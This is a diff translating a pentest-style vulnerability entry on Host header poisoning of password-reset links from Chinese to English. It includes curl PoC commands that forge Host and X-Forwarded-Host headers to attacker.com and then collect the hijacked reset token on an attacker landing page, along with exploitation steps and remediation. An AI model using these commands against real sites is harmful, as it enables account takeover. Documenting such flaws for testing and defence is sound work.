@@ -1,59 +1,59 @@
 ﻿---
-title: Host 头投毒（密码重置链接被劫持 → 任意账号接管）
-cve: 无（实现缺陷）
+title: Host header poisoning (hijacked password-reset links → arbitrary account takeover)
+cve: None (implementation flaw)
 severity: critical
 cvss: 9.1
-product: 自研找回密码/邀请链接（用 Host 拼 URL）
-versions: 任意
+product: Custom password-recovery/invitation links (URLs built from Host)
+versions: Any
 ports: 80, 443
-keywords: host, 头, 投毒, 密码重置, 链接, 劫持
-entry: POST /api/user/findpwd 的 Host / X-Forwarded-Host
+keywords: host, header, poisoning, password reset, links, hijacking
+entry: Host / X-Forwarded-Host in POST /api/user/findpwd
 verified: false
-sources: 公开资料整理（实现缺陷类）
+sources: Compiled from public sources (implementation flaws)
 ---
 
-## 指纹
+## Fingerprints
 
-- 找回密码/邀请/支付回调的邮件里 URL 与请求 Host 一致；
-- 反代存在且应用读取 `X-Forwarded-Host`。
+- URLs in password-recovery/invitation/payment-callback emails match the request Host;
+- A reverse proxy is present and the application reads `X-Forwarded-Host`.
 
-## 前置条件
+## Prerequisites
 
-- 邮件/短信里的链接由服务端按 Host 拼接；攻击者能触发发送。
+- The server builds email/SMS links from Host; an attacker can trigger sending.
 
 ## PoC
 
 ```bash
-# 1) 换 Host 触发重置，看邮件里链接域名
+# 1) Change Host to trigger a reset and inspect the link domain in the email
 curl -s -X POST 'https://target/api/user/findpwd' \
   -H 'Host: attacker.com' -H 'Content-Type: application/json' \
   -d '{"email":"victim@corp.com"}'
 
-# 2) 反代场景用 XFH
+# 2) Use XFH in reverse-proxy scenarios
 curl -s -X POST 'https://target/api/user/findpwd' \
   -H 'X-Forwarded-Host: attacker.com' -d '{"email":"victim@corp.com"}'
-# 判定：收到邮件里链接是 https://attacker.com/reset?token=... = 命中
+# Result: email contains https://attacker.com/reset?token=... = confirmed
 
-# 3) 双 Host / 绝对 URI 变体
+# 3) Duplicate Host / absolute URI variants
 curl -s 'https://target/api/user/findpwd' -H 'Host: attacker.com:443'
 ```
 
 ```bash
-# 4) 用劫持到的 token 改密（需受害者点链接，或用你自己的账号验证链路）
-curl -s 'https://attacker.com/reset?token=<token>'   # 落地页把 token 记录
+# 4) Change the password with the hijacked token (requires the victim to click, or verify the chain with your own account)
+curl -s 'https://attacker.com/reset?token=<token>'   # The landing page records the token
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先用自己的账号验证链路（收自己邮件）；
-2. 换 Host/XFH 再发一次，对比邮件里的域名；
-3. 命中即“可劫持任意用户重置链接”；
-4. 证据：两次请求 + 两封邮件的链接对比（token 打码）。
+1. Verify the chain with your own account first (receive your own email);
+2. Send again with a changed Host/XFH and compare email domains;
+3. Success means "arbitrary users' reset links can be hijacked";
+4. Evidence: two requests + comparison of the links in two emails (mask tokens).
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 站点 URL 走配置白名单，不用请求 Host；校验 Host 合法值；重置 token 绑定用户。
+- Use a configured allowlisted site URL, not the request Host; validate allowed Host values; bind reset tokens to users.
 
-## 参考
+## References
 
-- OWASP Host Header 攻击；CWE-644。
+- OWASP Host Header attacks; CWE-644.
